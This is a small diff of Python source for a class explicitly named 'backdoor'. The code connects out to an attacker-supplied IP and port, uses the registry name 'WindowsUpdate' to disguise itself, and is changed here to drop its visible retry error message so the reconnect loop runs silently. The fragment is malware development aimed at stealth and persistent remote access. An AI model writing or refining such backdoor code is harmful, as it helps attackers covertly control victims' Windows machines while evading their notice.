@@ -46,10 +46,7 @@ class backdoor:
                 self.connection.connect((ip, port))
                 self.REG_NAME = "WindowsUpdate"
             except socket.error:
-                wait_time = 5
-                print("[-] Error while trying to connect, trying again in {} seconds.".format(wait_time))
-                
-                time.sleep(wait_time)
+                time.sleep(5)
             else:
                 break
 
